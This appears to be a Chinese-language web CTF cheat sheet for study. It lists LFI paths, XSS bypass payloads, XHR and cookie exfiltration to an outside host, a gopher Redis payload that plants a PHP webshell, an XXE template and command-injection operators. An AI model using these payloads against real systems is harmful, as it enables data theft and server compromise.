Web CTF CheatSheet & Learning
===

Directory
===
- [LFI](#LFI)
- [XSS](#XSS)
- [XML](#XML)
- [Command Injection](#Command-Injection)

Helpful Resource
===
- [Web CheatSheet](https://github.com/w181496/Web-CTF-Cheatsheet)

Learning Resource
===
- [HackmeCTF](https://hackme.inndy.tw/)
- AIS3 2019 Pre-exam 

# LFI
- 直接 `../../etc/passwd` 測試
- 其他方法
    - `../etc/passwd%00`
    - 查看 source code
        - php://filter/convert.base64-encode/resource
- 敏感文件
    - log `/var/log/...`
    - config `/etc/...`
    - history `~/.history`

# XSS
## type
- 反射型:
    - server 針對用戶輸入做回應
    - 通常傷害較低, 必須藉由點擊惡意連結才能達成攻擊
    - ex. `http://url?name=<script>alert(1)</script>`
- 儲存型:
    - 輸入的 payload 會存在 server, 如留言板的留言
- DOM:
    - 瀏覽器 DOM 解析惡意資料
    - ex.
        - `<img src='http://url/user-image'>`: payload 為 `user-image`, 正常
        - `<img src='' onerror=alert(1)'>`: payload 為 `' onerror=alert(1)`, 惡意

## payload
- `<script>alert(1)</script>`: 元老級 xss 測試 payload
- `<svg onload=alert(1)></svg>`
    - `<svg/onload=alert(1)></svg>`: 反斜線可以 bypass 空格限制
    - 另一種方式: 換行
        ```html
        <svg
        onload=alert(1)>
        ```
- `<img src=# onerror=alert(1)`: 圖片內嵌
- `<a href="javascript:alert(1)">g</a>`: 連結 call function
- `<iframe src="javascript:alert(1)"></iframe>`: iframe 內嵌
- alert`1`: 反斜線限制
- `&#x61;&#x62;...`: HTML entity 中 hex 編碼
    - `&#40;&#41;`: 為 decimal 編碼
    - `ex: <img src=x onerror=alert&#x28;1&#x29;>`
- `javascript:document.location.href('http://<ip>?cookie='+document.cookie);`: 跳轉頁面
- javascript encode
    - \73\72: decimal
    - \u0034: unicode
        - equal to `\u{34}`
    - \x3A: hex

## xmlhttp 內網請求
我們能利用 ajax xmlhttp 實現網頁跳轉請求
[PS. 有關 html header](https://notfalse.net/40/http-representation)
- GET 的 payload
    ```javascript
    xmlhttp = new XMLHttpRequest();
    xmlhttp.onreadystatechange = function () {
        if (xmlhttp.readyState == 4 && xmlhttp.status == 200) {
            document.location.href = "https://careertest.ncu.edu.tw?body="+btoa(xmlhttp.responseText);
        }
    }
    xmlhttp.open("GET", "request.php");
    xmlhttp.send();
    ```
- POST 的 payload
    ```javascript
    xmlhttp = new XMLHttpRequest();
    xmlhttp.onreadystatechange = function () {
        if (xmlhttp.readyState == 4 && xmlhttp.status == 200) {
            document.location.href = "https://careertest.ncu.edu.tw?body="+btoa(xmlhttp.responseText);
        }
    }
    xmlhttp.open("POST", "request.php", true);
    xmlhttp.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
    xmlhttp.send("url=file:///var/www/html/config.html");
    ```
    - POST 必須加上 header `Content-Type` 來告訴 server content 的編碼方式
        - 常見是 `application/x-www-form-urlencoded`, 此 header 告訴 server POST form 是 key->value 的形式
    - onreadystatechange 為 send 事件的狀態碼, 4 為 complete.
    - `open(method, url, true/false)` true 為 async, 表不同步

## 打 redis
redis 是一個 in-memory key-value 的 database, 就像是 database 在做 cache, 能夠大大提昇效能
- 在沒認證機制下, 很容易被攻擊
- 在攻擊 redis, 可以使用 gopher 協議傳送 tcp stream
    - 格式為 `gopher:/ip:port/_ + payload`
    - payload 為 hex 編碼
- 可以透過 tcpdump 做測試
    ```shell
    tcpdump port 6379 -w <filename>
    ```
    - `*<array長度>` ex. set name test ==> \*3
    - `$<字串長>` ex. name ==> $4
- redis payload
    - source
        ```
        flushall
        config set dir /path/of/redis ## 設定 redis 儲存路徑
        config set dbfilename redis-filename ## 設定 redis 檔案名稱
        set webshell "<?php phpinfo(); ?>"
        save
        quit
        ```
    - get key
        ```
        KEYS *
        ```
    - url 編碼過得
        ```
        curl gopher://127.0.0.1:6379/_flushall%0D%0Aconfig%20set%20dir%20/path/of/redis%0D%0Aconfig%20set%20dbfilename%20redis-filename%0D%0Aset%20webshell%20%22%3C%3Fphp%20phpinfo%28%29%3B%20%3F%3E%22%0D%0Asave
        ```
    - 注意
        - redis 都是以 \r\n （CRLF) 當結尾
        - 傳送到 server 會被 decode 一次, 所以需要 double url encode

## Get Data
- `document.cookie`: cookie
- `document.documentElement.innerHTML` source code
    - `btoa(document.documentElement.innerHTML)`: base64 後的
- `document.body.innerHTML`

# XML
- XML format
```xml
<?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE jerry[
<!ENTITY xxe SYSTEM "https://url/file.txt">
]>

<root>
&xxe;
</root>
```
- payload 需要 URL encode (&xxe 會炸掉)

# Command Injection
- `A;B`: 不管 A 是否正確, B 皆會執行
- `A&B`: A bg, B fg, 同步
- `A&&B`: A 做完換 B
- `A|B`: A 結果傳給 B
- `A||B`: A 失敗才會 B
- 當 `preg_match` multiple line mode 時(/m)
    - `^`: metacharacter, start of string
    - `$`: metacharacter, end of string
    - 在此 modifier, `preg_match` 只會判斷第一行
- php `header(url)` ==執行完== php 後跳轉至 url, 不過用 curl 抓, 可以抓到執行結果